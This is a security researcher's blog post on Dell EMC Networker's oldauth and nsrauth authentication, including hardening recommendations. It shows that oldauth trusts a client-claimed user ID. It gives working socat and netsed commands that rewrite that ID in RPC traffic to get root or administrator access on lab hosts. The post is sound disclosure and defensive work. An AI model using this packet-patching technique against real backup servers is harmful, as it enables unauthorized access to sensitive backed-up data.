---
layout: post
title:  "Dell EMC Networker - oldauth is not auth !"
image: assets/backup_stacks_by_jaymis_cc_by_20_social.jpg
author: qkaiser
date:   2021-03-11 10:00:00
description: In this article, we'll cover the different authentication mechanisms implemented by Networker (oldauth and nsrauth) and explain in details why relying on oldauth is the worst decision you can make when deploying Dell EMC Networker.
summary: In this article, we'll cover the different authentication mechanisms implemented by Networker (oldauth and nsrauth) and explain in details why relying on oldauth is the worst decision you can make when deploying Dell EMC Networker.
comments: true
categories: security
---

In a previous life I came upon Dell EMC Networker in different environments and found different ways to exploit the nsrexecd daemon in similar ways than [CVE-2017-8023](https://www.cvedetails.com/cve/CVE-2017-8023/), without ever being 100% sure that it indeed was that specific CVE. The CVE description clearly mentions "unauthenticated remote code execution vulnerability in the Networker Client execution service (nsrexecd) **when oldauth authentication method is used**", so I decided to investigate Networker authentication mechanisms by the end of 2020.

{:.foo}
!["Backup Stacks" by Jaymis is licensed with CC BY 2.0.]({{site.url}}/assets/backup_stacks_by_jaymis_cc_by_20.jpg)

> EMC NetWorker (formerly Legato NetWorker) is an enterprise-level data protection software product that unifies and automates backup to tape, disk-based, and flash-based storage media across physical and virtual environments for granular and disaster recovery. Cross-platform support is provided for Linux, Windows, macOS, NetWare, OpenVMS and Unix environments.

In this article, we'll cover the different authentication mechanisms implemented by Networker (oldauth and nsrauth) and explain in details why relying on oldauth is the worst decision you can make when deploying Dell EMC Networker.

Understanding the weaknesses of oldauth will help us in a second article where I'll discuss different ways to gain unauthenticated remote command execution on Dell EMC Networker Server.

### EMC Networker Authentication Primer

Dell EMC Networker RPC service supports two different authentication mechanisms:

- **oldauth** - legacy authentication mechanism, kept for backward compatibility
- **nsrauth** - newer authentication mechanism, with its own flaws

Both mechanisms are supported by default, with an administrator attribute limiting access to the following users:

- on a UNIX or Linux host, any root user from any host
- on a Windows host, any user in the administrators group from any host

We confirmed this in our lab by printing the administrator attribute on a Linux and a Windows host:

```
nsradmin> print
    type: NSR log;
    administrator: root,
    "user=root,host=networker-server";
```

```
nsradmin> print
    type: NSR log;
    administrator: Administrators,
    "group=Administrators,host=desktop-4o00s9d";
```

These authentication mechanisms protects the RPC daemon named **nsrexecd**, which can be called to execute commands. From the nsrexec manual page:

> The  nsrexec  command  is run only by other NetWorker commands. It is used to remotely execute commands on NetWorker clients running nsrexecd, and also to monitor the progress of those commands.

This description is misleading given that nsrexecd runs on every EMC Networker component (server, client, and storage node). I'd also like to point out that by "commands", they mean "networker commands" and not "arbitrary commands". Networker commands are a limited subset of Networker binaries such as *savefs* or *savegrp*.

### oldauth Authentication Mechanism

Oldauth authentication mechanism is more of an identification mechanism in that the client just has to state that it is a specific user for the server to trust them. When oldauth is used, the user identifier of the local user executing the Networker client is transmitted as a 32 bit integer in the first RPC request.

The hexdump below is an RPC call to nsr\_render\_log, with the user identifier highlighted. We see that the user id is 0x000003e8 (1000 decimal), which is the default identifier of the first non-root user created on Linux

![Networker RPC request sent by uid=1000]({{site.url}}/assets/oldauth_userid_1.png)

If the request is sent out by the root user, we see the user identifier is now 0x00000000 (0 decimal), which is the default user identifier of the root user on Linux:

![Networker RPC request sent by root user]({{site.url}}/assets/oldauth_userid_root.png)

The same mechanism is used by Windows hosts, although the user numbering changes. If the request is sent by a user that is not a member of the Administrators group, the user identifier is set to '1' (0x00000001).

![Networker RPC request sent from Windows by normal user]({{site.url}}/assets/oldauth_windows_non_admin.png)

If the request is sent by a user that is a member of the Administrators group, the user identifier is set to '0' (0x00000000), which coincidentally matches the root user id.

![Networker RPC request sent from Windows by Administrators member]({{site.url}}/assets/oldauth_windows_admin.png)


Demonstrating that this is how Networker authenticates users with oldauth can be done with socat and netsed placed between a Networker client running as an unprivileged user and a remote Networker server.

![oldauth_patching_diagram.png]({{site.url}}/assets/oldauth_patching_diagram.png)


Launching socat as a simple TCP forwarder and netsed with a match and replace rule to replace the user identifier 0x03e8 with user identifier 0x0000.

```
socat -v -v -v TCP4-LISTEN:7938,reuseaddr,fork TCP:192.168.121.4:7938
netsed tcp 7937 192.168.121.4 7937 s/%03%e8/%00%00 
```

#### Live Patching RPC Requests (Linux Server)

If we send an RPC request directly to the remote server, we get a permission refused:

```
EXPORT RCMD='nsr_render_log /nsr/logs/daemon.raw'
./nsrexec -c 192.168.121.4
145843:nsr_render_log: Unable to open log file 'daemon.raw': Permission refused
```

If we send the request through our "patcher host", the remote server genuinely think we are root and provide us with the file content we requested through RPC:

```
EXPORT RCMD='nsr_render_log /nsr/logs/daemon.raw'
./nsrexec -c 192.168.121.1
101040 22/02/21 13:32:43  1 3 0 2795517760 4001 0 networker-server nsrexecd RAP notice
---snip---
```

When the request goes through, we can see netsed patching the user identifier:

```
netsed tcp 7937 192.168.121.4 7937 s/%03%e8/%00%00 
netsed 1.2 by Julien VdG <julien@silicone.homelinux.org>
      based on 0.01c from Michal Zalewski <lcamtuf@ids.pl>
[*] Parsing rule s/%03%e8/%00%00...
[+] Loaded 1 rule...
[+] Using fixed forwarding to 192.168.121.4,7937.
[+] Listening on port 7937/tcp.
[+] Got incoming connection from 192.168.121.140,38493 to 192.168.121.1,7937
[*] Forwarding connection to 192.168.121.4,7937
[+] Caught client -> server packet.
    Applying rule s/%03%e8/%00%00...
    Applying rule s/%03%e8/%00%00...
    Applying rule s/%03%e8/%00%00...
    Applying rule s/%03%e8/%00%00...
[*] Done 4 replacements, forwarding packet of size 164 (orig 164).
--snip--
```

#### Live Patching RPC Requests (Windows Server)

If we send an RPC request directly to the remote server, we get a permission refused:

```
C:\Users\Jane Doe>set RCMD=nsr_render_log "C:\Program Files\EMC NetWorker\nsr\logs\daemon.raw"
C:\Users\Jane Doe>nsrexec -c 192.168.121.182
90475:nsrexecd: User 'uid1' cannot request a command execution.
```

If we send the request through our "patcher host", the remote server genuinely think we are a member of Administrators group and provide us with the file content we requested through RPC:

```
C:\Users\Jane Doe>set RCMD=nsr_render_log "C:\Program Files\EMC NetWorker\nsr\logs\daemon.raw"
C:\Users\Jane Doe>nsrexec -c 192.168.121.1
101040 22/02/21 13:32:43  1 3 0 2795517760 4001 0 networker-server nsrexecd RAP notice
--snip--
```

When the request goes through, we can see netsed patching the user identifier:

```
netsed tcp 7937 192.168.121.182 7937 s/%00%00%00%01%ff%ff%ff%fe%00%00%00%01%ff%ff%ff%fe/%00%00%00%00%ff%ff%ff%fe%00%00%00%01%ff%ff%ff%fe
netsed 1.2 by Julien VdG <julien@silicone.homelinux.org>
      based on 0.01c from Michal Zalewski <lcamtuf@ids.pl>
[*] Parsing rule s/%00%00%00%01%ff%ff%ff%fe%00%00%00%01%ff%ff%ff%fe/%00%00%00%00%ff%ff%ff%fe%00%00%00%01%ff%ff%ff%fe...
[+] Loaded 1 rule...
[+] Using fixed forwarding to 192.168.121.182,7937.
[+] Listening on port 7937/tcp.
[+] Got incoming connection from 192.168.121.30,65130 to 192.168.121.1,7937
[*] Forwarding connection to 192.168.121.182,7937
[+] Caught client -> server packet.
    Applying rule s/%00%00%00%01%ff%ff%ff%fe%00%00%00%01%ff%ff%ff%fe/%00%00%00%00%ff%ff%ff%fe%00%00%00%01%ff%ff%ff%fe...
[*] Done 1 replacements, forwarding packet of size 188 (orig 188).
[+] Caught server -> client packet.
[*] Forwarding untouched packet of size 36.
```

The key takeaway here is that oldauth implements **identification** rather than authentication.

### nsrauth Authentication Mechanism

The official documentation states that

> NetWorker hosts and daemons use the nsrauth mechanism to authenticate components and users, and to verify hosts. The nsrauth GSS authentication mechanism is a strong authentication that is based on the Secure Sockets Layer (SSL) protocol.

The nsrexecd service on each NetWorker host provides the component authentication services. The first time the nsrexecd process starts on a host, the process creates the following unique credentials for the host:

- 2048-bit RSA private key
- 1024-bit RSA private key, for backward compatibility
- self-signed certificate or public key
- NW Instance ID
- hostname

When a NetWorker host starts a session connection to another host, the following (simplified) steps occur:

1. an RPC session is initialized 
2. the client send its certificate Common Name to the server
3. the server send its certificate Common Name to the client
4. the client send its certificate in PEM format
5. the server send its certificate in PEM format
6. a mutually authenticated SSL/TLS session is established using the exchanged certificates and corresponding keys

![nsrauth session establishment diagram]({{site.url}}/assets/nsrauth_rpc_ssl.png)

The exchanged common names and certificates are actually checked against each peer NSR Peer Information database, and only the matched certificate in that database will be trusted when establishing the mutually authenticated SSL/TLS session. If no information is present in that database, EMC Networker peers go into TOFU (Trust On First Use) mode, by trusting that certificate and saving it in its database for future use.

The diagram below presents the different authentication checks that are performed prior to establishing the session:

![Trust on First Use in nsrauth]({{site.url}}/assets/nsrauth_tofu.png)

The risk related to Trust On First Use is only mentioned in Dell EMC Networker [Security Configuration Guide](https://www.delltechnologies.com/en-us/collaterals/unauth/technical-guides-support-information/products/data-protection/docu89911.pdf):

> When a NetWorker host begins a connection with another host for the first time, NetWorker automatically creates an NSR Peer Information resource for the beginning host in the nsrexec database on the target host. NetWorker uses the information that is contained in the NSR Peer Information resource to verify the identity of the beginning host on subsequent authentication attempts. Manually create the NSR Peer Information resource on the target client before the two hosts communicate for the first time, to eliminate the possibility that an attacker could compromise this process.

## A difficult security baseline

Now that we have covered each authentication mechanism and their respective flaws, we can define what should be the minimum security baseline for a Dell EMC Networker deployment. This is quite complex because there are multiple layers to it, sometimes executing kind of the same job, for example:

- IP allow-list in NSRLA 'auth methods' field limit the source IP from which an RPC request can be received
- A file (*/nsr/res/servers* on Linux, *C:\Program Files\EMC NetWorker\nsr\res\servers* on Windows) can be used to define a list of trusted hosts from which RPC requests can be received
- the NSRLA administrators list contains a list of users. If a user is explicitly linked to a hostname, the daemon supposedly execute a reverse DNS lookup to make sure the request comes from the right host. If a hostname is not set, the daemon accepts RPC request from any host as long as they claim the right username, considering it's allowed by the allow-list

For a Networker system to be fully protected against abuse, the following should be true **for all hosts** running a Networker component:

- only nsrauth is enabled, oldauth is explicitly forbidden in NSRLA 'auth methods' field
- IP allow-listing is enforced (either in NSRLA 'auth methods' or 'servers' file) on Networker nodes (I'd recommend: trusted host can contact servers, servers can contact clients and storage node, deny everything else)
- user accounts in the administrator list should be explicitly linked to a host, get rid of usernames without a hostname
- NSR Peer Information, including certificates, are provisioned on all Networker hosts (clients, storage nodes, servers)

This leaves plenty of room for attackers in real world deployment, especially when we know that the **default configuration of Networker components allow the oldauth mechanism from any source IP**.

## Conclusion

Backup systems is the holy grail to attackers given they contain all the sensitive information from backed up hosts without the need to compromise them in the first place. Relying on identification mechanisms rather than strong authentication for a service that let's you interact with these backup systems was a bad design decision that probably still affects lots of Networker deployments.

I fully understand the pain of backup systems administrators that have to support systems built when Solaris and rsh was all the rage, but I hope this piece will help everyone understand the risk and convince you to put mitigations in place. You don't even need to implement everything right now ! You can start by
allow-listing source IPs, then review the authorized users lists, then slowly move the infrastructure to nsrauth rather than oldauth.

Dell, maybe stop releasing versions with oldauth supported and 0.0.0.0/0 as allow-list ? I know you do for AWS cloud deployments of Networker since version 19.4 :)

In the next piece, I'll demonstrate how to gain unauthorized RCE as root on Dell EMC Networker Server with a default configuration by using different methods (legit networker commands, command injection, and Erlang abuse).

## References

- [0] <span id="ref0"/>**Dell Technologies** - *EMC NetWorker Security Configuration Guide* - [https://www.delltechnologies.com/en-us/collaterals/unauth/technical-guides-support-information/products/data-protection/docu91948.pdf](https://www.delltechnologies.com/en-us/collaterals/unauth/technical-guides-support-information/products/data-protection/docu91948.pdf)
